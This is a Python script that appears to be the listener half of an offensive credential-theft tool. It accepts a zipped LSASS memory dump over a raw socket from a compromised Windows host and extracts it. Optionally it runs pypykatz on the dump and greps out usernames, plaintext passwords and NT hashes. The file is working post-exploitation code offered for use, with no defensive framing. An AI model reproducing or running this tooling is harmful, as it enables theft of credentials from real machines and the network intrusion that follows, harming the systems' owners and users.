#!/usr/bin/env python3

import os
import socket
import zipfile
import hashlib
from argparse import ArgumentParser

import tqdm

BUFFER_SIZE = 4096
SEPARATOR = '|'


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('host', action='store', type=str, help='address to listen on')
	parser.add_argument('port', action='store', type=int, help='port to listen on')
	parser.add_argument('--md5', action='store_true', default=False, help='calculate MD5 hash')
	parser.add_argument('--parse', action='store_true', default=False, help='parse the dump with pypykatz and print the results')
	return parser.parse_args()


def serve(host, port):
	sock = socket.socket()

	sock.bind((host, port))
	sock.listen(5)
	print(f'Serving socket server on {host} port {port} ...')

	client_socket, addr = sock.accept()
	client_host, client_port = addr
	print(f'[+] Received connection from {client_host}:{client_port}')

	received = client_socket.recv(BUFFER_SIZE).decode()
	filename, filesize = received.split(SEPARATOR)
	filename, filesize = f'{filename}.zip', int(filesize)

	print('[*] Started downloading LSASS dump...')

	with tqdm.tqdm(range(filesize), filename, ncols=100, unit='B', unit_scale=True, unit_divisor=1024) as pbar:
		with open(filename, 'wb') as f:
			while True:
				bytes_read = client_socket.recv(BUFFER_SIZE)
				if not bytes_read:
					break
				f.write(bytes_read)
				pbar.update(len(bytes_read))

	client_socket.close()
	sock.close()

	return filename


def extract_zip(zipname, md5=False):
	if md5:
		with open(zipname, 'rb') as f:
			h = hashlib.md5()
			for chunk in iter(lambda: f.read(4096), b''):
				h.update(chunk)

		print(f'[*] MD5: {h.hexdigest()}')

	with zipfile.ZipFile(zipname, 'r') as zf:
		for name in zf.namelist():
			extracted_name = zf.extract(name)
			extracted_name = os.path.basename(extracted_name)
			new_name = zipname.replace('zip', 'dmp')
			os.rename(extracted_name, new_name)
			print(f'[+] {zipname} was extracted to {new_name}')

	os.remove(zipname)

	return new_name


if __name__ == '__main__':
	args = parse_args()

	zipname = serve(args.host, args.port)
	datafile = extract_zip(zipname, args.md5)

	if args.parse:
		parsed_name = datafile.replace('dmp', 'parsed')
		print('[=] Parsing with pypykatz...')
		os.system(f"""pypykatz lsa minidump {datafile} > {parsed_name}""")
		print('[+] Passwords:')
		os.system(f"""grep -a -P '\tusername ' {parsed_name} -A2 | grep -a -e username -e password | grep -a -v None""")
		print('[+] Hashes:')
		os.system(f"""grep -a -P 'Username: ' {parsed_name} -A4 | grep -a -e Username -e Domain -e NT | grep -a -v None""")
